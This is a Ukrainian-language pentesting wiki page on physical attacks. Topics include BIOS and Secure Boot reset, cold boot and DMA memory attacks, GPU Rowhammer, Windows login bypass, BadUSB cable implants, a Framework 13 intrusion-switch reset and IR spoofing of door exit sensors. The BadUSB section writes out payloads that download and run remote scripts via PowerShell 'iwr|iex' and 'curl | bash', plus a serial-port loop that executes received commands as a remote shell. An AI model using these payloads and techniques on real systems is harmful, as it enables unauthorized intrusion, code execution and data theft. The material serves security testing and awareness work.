# Фізичні атаки

{{#include ../banners/hacktricks-training.md}}

## Відновлення пароля BIOS і безпека системи

**Скидання BIOS** можна виконати кількома способами. Більшість материнських плат містять **батарею**, вилучення якої приблизно на **30 хвилин** скине налаштування BIOS, зокрема пароль. Також можна змінити положення **перемички на материнській платі**, з'єднавши певні контакти, щоб скинути ці налаштування.

У ситуаціях, коли апаратне втручання неможливе або недоцільне, рішенням можуть стати **програмні інструменти**. Запуск системи з **Live CD/USB** із дистрибутивом на кшталт **Kali Linux** надає доступ до таких інструментів, як **_killCmos_** і **_CmosPWD_**, які можуть допомогти у відновленні пароля BIOS.

Якщо пароль BIOS невідомий, триразове введення неправильного пароля **зазвичай** призводить до появи коду помилки. Цей код можна використати на таких вебсайтах, як [https://bios-pw.org](https://bios-pw.org), щоб потенційно отримати робочий пароль.

### Безпека UEFI

Для сучасних систем, що використовують **UEFI** замість традиційного BIOS, можна застосувати інструмент **chipsec** для аналізу та зміни налаштувань UEFI, зокрема вимкнення **Secure Boot**. Це можна виконати за допомогою такої команди:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Аналіз RAM і Cold Boot Attacks

RAM ненадовго зберігає дані після вимкнення живлення, зазвичай протягом **1–2 хвилин**. Цей час можна збільшити до **10 хвилин**, застосовуючи холодні речовини, наприклад рідкий азот. Протягом цього подовженого періоду можна створити **memory dump** за допомогою таких інструментів, як **dd.exe** і **volatility**, для подальшого аналізу.

---

## GPU Rowhammer проти таблиць сторінок

Сучасні GPU Rowhammer-атаки стають значно кориснішими, коли націлені на **метадані віртуальної пам'яті GPU**, а не на звичайні буфери. Нещодавні дослідження **GDDR6 NVIDIA Ampere GPUs** показують, що атакувальник, який виконує непривілейований CUDA-код, може створювати специфічні для GPU шаблони hammering, використовувати **memory massaging** для розміщення структур paging у вразливих рядках, а потім змінювати біти в **last-level page table** або проміжному **page directory**. Після пошкодження одного translation entry атакувальник може отримати **довільне читання/запис пам'яті GPU**, а потім перейти до компрометації host.<sup>[[1]](#references)[[2]](#references)</sup>

### Шаблон експлуатації

1. **Профілювати рядки, придатні для hammering**, у GDDR6 і створити шаблони hammering, що враховують refresh / не є однорідними та обходять вбудовані в DRAM засоби захисту.
2. **Виконати memory massaging алокацій GPU**, щоб драйвер розмістив структури трансляції сторінок у придатних для hammering фізичних областях, а не залишав їх у стандартному захищеному пулі. На практиці це може означати вичерпання області page-table для low-memory і розпилення великих розріджених UVM-мапінгів із контрольованими кроками.
3. **Змінити метадані трансляції**, такі як **PFN** або біти, пов'язані з aperture, усередині запису page-table / page-directory, щоб контрольована атакувальником virtual page вказувала на сторінки page-table, довільну пам'ять GPU або системні мапінги, доступні host.
4. Повторно використати підроблений мапінг для перезапису додаткових translation entries і підвищити привілеї до **довільного читання/запису пам'яті GPU** між контекстами GPU.

### Перехід до host і засоби захисту

- Якщо **IOMMU вимкнено**, підроблені мапінги system-aperture можуть відкрити GPU доступ до довільної **фізичної пам'яті host**, перетворюючи примітив GPU на повну компрометацію host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** націлений на записи last-level page-table, тоді як **GeForge** показує, що пошкодження рівня page-directory може бути простішим, оскільки один перевернутий біт може перенаправити більший підряд дерева трансляції. Не слід вважати критично важливим для безпеки лише один рівень paging.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** усе ще має значення, оскільки блокує прямий шлях до довільної пам'яті host, який використовують GDDRHammer/GeForge, але це **не повний захист**. **GPUBreach** демонструє перехід на другий етап, під час якого атакувальник пошкоджує доступні для запису GPU буфери CPU, якими володіє драйвер, а потім активує memory-safety bugs у драйвері NVIDIA, щоб отримати примітив запису в kernel і **root shell**, навіть коли IOMMU увімкнено.<sup>[[3]](#references)</sup>
- **System-level ECC** є практичним кроком hardening на підтримуваних workstation/server GPU. Споживчі GPU без ECC мають слабшу поверхню захисту.<sup>[[4]](#references)</sup>
- Ці атаки не є суто теоретичними: **GeForge** повідомив про **1 171** перевернутий біт на RTX 3060 і **202** на RTX A6000, чого було достатньо для створення робочого ланцюга підвищення привілеїв на host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Атаки Direct Memory Access (DMA)

**INCEPTION** — це інструмент, розроблений для **маніпуляції фізичною пам'яттю** через DMA, сумісний із такими інтерфейсами, як **FireWire** і **Thunderbolt**. Він дає змогу обходити процедури входу, змінюючи пам'ять так, щоб приймався будь-який пароль. Однак він неефективний проти систем **Windows 10**.

---

## Live CD/USB для доступу до системи

Заміна системних бінарних файлів, таких як **_sethc.exe_** або **_Utilman.exe_**, копією **_cmd.exe_** може надати командний рядок із системними привілеями. Такі інструменти, як **chntpw**, можна використовувати для редагування файлу **SAM** інсталяції Windows, що дає змогу змінювати паролі.

**Kon-Boot** — це інструмент, який дає змогу входити до систем Windows без знання пароля, тимчасово змінюючи kernel або UEFI Windows. Додаткову інформацію можна знайти за адресою [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).<sup>[[10]](#references)</sup>

---

## Робота з функціями безпеки Windows

### Комбінації клавіш завантаження та відновлення

- **Supr**: доступ до налаштувань BIOS.
- **F8**: вхід у Recovery mode.
- Натискання **Shift** після банера Windows може обійти autologon.

### Пристрої BAD USB

Такі пристрої, як **Rubber Ducky** і **Teensyduino**, слугують платформами для створення пристроїв **bad USB**, здатних виконувати заздалегідь визначені payloads після підключення до цільового комп'ютера.

### Volume Shadow Copy

Привілеї адміністратора дають змогу створювати копії конфіденційних файлів, зокрема файлу **SAM**, через PowerShell.

## Техніки імплантів BadUSB / HID

### Імпланти кабелів із керуванням через Wi-Fi

- Імпланти на базі ESP32-S3, такі як **Evil Crow Cable Wind**, приховані всередині кабелів USB-A→USB-C або USB-C↔USB-C, визначаються виключно як USB-клавіатура та надають доступ до свого C2 stack через Wi-Fi. Оператору достатньо подати живлення на кабель від host жертви, створити hotspot з іменем `Evil Crow Cable Wind` і паролем `123456789`, а потім відкрити [http://cable-wind.local/](http://cable-wind.local/) (або його DHCP-адресу), щоб отримати доступ до вбудованого HTTP-інтерфейсу.<sup>[[8]](#references)</sup>
- Вебінтерфейс містить вкладки *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* і *Config*. Збережені payloads позначаються для відповідної OS, розкладки клавіатури перемикаються на льоту, а рядки VID/PID можна змінювати, щоб імітувати відомі периферійні пристрої.
- Оскільки C2 працює всередині кабелю, телефон може готувати payloads, запускати їх і керувати обліковими даними Wi-Fi без взаємодії з OS host — це ідеально для короткочасних фізичних проникнень.

### OS-aware AutoExec payloads

- Правила AutoExec прив'язують один або кілька payloads до негайного запуску після USB enumeration. Імплант виконує спрощене fingerprinting OS і вибирає відповідний script.
- Приклад workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) або `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Оскільки виконання відбувається без нагляду, проста заміна зарядного кабелю може забезпечити початковий доступ за принципом «plug-and-pwn» у контексті користувача, який увійшов у систему.

### HID-bootstrapped remote shell через Wi-Fi TCP

1. **Keystroke bootstrap:** збережений payload відкриває консоль і вставляє loop, який виконує все, що надходить через новий USB serial device. Мінімальний варіант для Windows:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Кабельний міст:** Імплант підтримує канал USB CDC відкритим, поки його ESP32-S3 запускає TCP client (Python script, Android APK або desktop executable) назад до оператора. Будь-які байти, введені в TCP-сеанс, пересилаються в описаний вище serial-цикл, забезпечуючи remote command execution навіть на ізольованих від мережі хостах. Вивід обмежений, тому оператори зазвичай виконують команди навмання (створення облікових записів, підготовка додаткових інструментів тощо).

### Поверхня HTTP OTA update

- Той самий web stack зазвичай надає неавторизовані оновлення firmware. Evil Crow Cable Wind прослуховує `/update` і записує будь-який завантажений binary:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Польові оператори можуть змінювати функції на льоту (наприклад, прошивати firmware flash USB Army Knife) під час операції, не відкриваючи кабель, що дає змогу implant переходити до нових можливостей, залишаючись підключеним до цільового хоста.

## Обхід шифрування BitLocker

Шифрування BitLocker потенційно можна обійти, якщо **пароль відновлення** буде знайдено у файлі дампа пам'яті (**MEMORY.DMP**). Для цього можна використати такі інструменти, як **Elcomsoft Forensic Disk Decryptor** або **Passware Kit Forensic**.

---

## Social Engineering для додавання ключа відновлення

Новий ключ відновлення BitLocker можна додати за допомогою Social Engineering, переконавши користувача виконати команду, яка додає новий ключ відновлення, що складається з нулів, тим самим спрощуючи процес розшифрування.

---

## Експлуатація перемикачів відкриття корпусу / обслуговування для скидання BIOS до заводських налаштувань

Багато сучасних ноутбуків і настільних комп'ютерів малого форм-фактора містять **перемикач відкриття корпусу**, за яким стежать Embedded Controller (EC) і firmware BIOS/UEFI. Хоча основне призначення перемикача полягає у створенні сповіщення в разі відкриття пристрою, виробники іноді реалізують **недокументований ярлик відновлення**, який активується, якщо перемикач перемкнути в певній послідовності.<sup>[[5]](#references)[[6]](#references)</sup>

### Як працює атака

1. Перемикач підключений до **переривання GPIO** на EC.
2. Firmware, що працює на EC, відстежує **часові інтервали та кількість натискань**.
3. Коли розпізнається жорстко задана послідовність, EC викликає процедуру *mainboard-reset*, яка **стирає вміст системної NVRAM/CMOS**.
4. Під час наступного завантаження BIOS завантажує стандартні значення — **пароль supervisor, ключі Secure Boot і всі користувацькі налаштування видаляються**.

> Після вимкнення Secure Boot і видалення пароля firmware зловмисник може просто завантажити будь-який зовнішній образ OS та отримати необмежений доступ до внутрішніх дисків.

### Реальний приклад — ноутбук Framework 13

Ярлик відновлення для Framework 13 (11-го/12-го/13-го покоління) має такий вигляд:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Після десятого циклу EC встановлює прапорець, який instructs BIOS стерти NVRAM під час наступного перезавантаження. Уся процедура займає ~40 с і потребує **лише викрутки**.<sup>[[5]](#references)</sup>

### Загальна процедура експлуатації

1. Увімкніть цільовий пристрій або виконайте suspend-resume, щоб EC запрацював.
2. Зніміть нижню кришку, щоб отримати доступ до перемикача intrusion/maintenance.
3. Відтворіть специфічну для vendor послідовність перемикань (зверніться до документації, форумів або виконайте reverse-engineer прошивки EC).
4. Зберіть пристрій і перезавантажте його — захист firmware має бути вимкнено.
5. Завантажте live USB (наприклад, Kali Linux) і виконайте звичайний post-exploitation (credential dumping, data exfiltration, імплантація malicious EFI binaries тощо).

### Виявлення та Mitigation

* Реєструйте події chassis-intrusion в OS management console і зіставляйте їх із неочікуваними скиданнями BIOS.
* Використовуйте **tamper-evident seals** на гвинтах/кришках, щоб виявляти відкривання.
* Зберігайте пристрої у **фізично контрольованих зонах**; вважайте, що фізичний доступ дорівнює повній компрометації.
* Якщо така можливість доступна, вимкніть функцію vendor “maintenance switch reset” або вимагайте додаткової cryptographic authorisation для скидання NVRAM.

---

## Прихована IR Injection проти No-Touch Exit Sensors

### Характеристики сенсора
- Комерційні “wave-to-exit” sensors поєднують near-IR LED emitter із receiver module на кшталт пульта від телевізора, який повідомляє logic high лише після виявлення кількох імпульсів (~4–10) правильної несучої (≈30 кГц).<sup>[[7]](#references)</sup>
- Пластиковий кожух не дає emitter і receiver дивитися безпосередньо один на одного, тому controller припускає, що будь-яка підтверджена несуча надійшла від близького відбиття, і керує relay, який відмикає дверний strike.
- Коли controller вважає, що ціль присутня, він часто змінює outbound modulation envelope, але receiver продовжує приймати будь-який burst, що відповідає відфільтрованій несучій.

### Процедура атаки
1. **Захопіть профіль випромінювання** — під’єднайте logic analyser до контактів controller, щоб записати waveforms до виявлення та після виявлення, які керують внутрішнім IR LED.
2. **Відтворюйте лише waveform “post-detection”** — від’єднайте/проігноруйте штатний emitter і з самого початку керуйте зовнішнім IR LED уже активованим pattern. Оскільки receiver враховує лише кількість імпульсів/частоту, він сприймає spoofed carrier як справжнє відбиття та активує relay line.
3. **Керуйте передаванням** — передавайте carrier налаштованими bursts (наприклад, десятки мілісекунд увімкнення, приблизно стільки ж вимкнення), щоб подати мінімальну кількість імпульсів без насичення AGC receiver або його логіки обробки interference. Безперервне випромінювання швидко знижує чутливість sensor і припиняє спрацьовування relay.

### Далекодійна Reflective Injection
- Заміна bench LED на high-power IR diode, MOSFET driver і focusing optics забезпечує надійне спрацьовування з відстані ~6 м.
- Attacker не потребує line-of-sight до receiver aperture; наведення променя на внутрішні стіни, стелажі або дверні рами, видимі крізь скло, дає змогу відбитій енергії потрапити в ~30° field of view і імітувати помах рукою на близькій відстані.
- Оскільки receivers очікують лише слабкі відбиття, значно потужніший зовнішній beam може відбиватися від кількох поверхонь і все одно залишатися вище detection threshold.

### Weaponised Attack Torch
- Вбудовування driver у комерційний flashlight приховує tool у всіх на виду. Замініть видимий LED на high-power IR LED, узгоджений із band receiver, додайте ATtiny412 (або подібний MCU) для генерації bursts ≈30 кГц і використайте MOSFET для sink струму LED.
- Telescopic zoom lens звужує beam для збільшення дальності/точності, а vibration motor під керуванням MCU дає haptic confirmation активної modulation без випромінювання видимого світла.
- Перемикання між кількома збереженими modulation patterns (дещо різними carrier frequencies та envelopes) підвищує сумісність із різними rebranded sensor families, даючи operator змогу сканувати відбивні поверхні, доки relay не клацне, а двері не відкриються.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
